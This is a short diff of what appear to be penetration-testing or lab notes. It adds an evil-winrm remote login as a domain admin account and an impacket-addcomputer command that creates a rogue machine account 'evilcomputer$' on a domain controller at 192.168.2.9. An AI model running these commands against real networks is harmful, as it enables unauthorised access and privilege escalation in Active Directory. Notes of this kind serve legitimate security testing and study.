@@ -32,4 +32,6 @@ sudo ls -la /mnt/it_stuff/Scripts
 
 ```
 evil-winrm -i 192.168.2.9 -u 'valentin.badanov' -p 'PASS'
+evil-winrm -i 192.168.2.9 -u 'valentin.badanov_adm' -p 'PASS'
+impacket-addcomputer -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 192.168.2.9 odeby.cdb/valentin.badanov_adm:'PASS' -no-add 
 ```
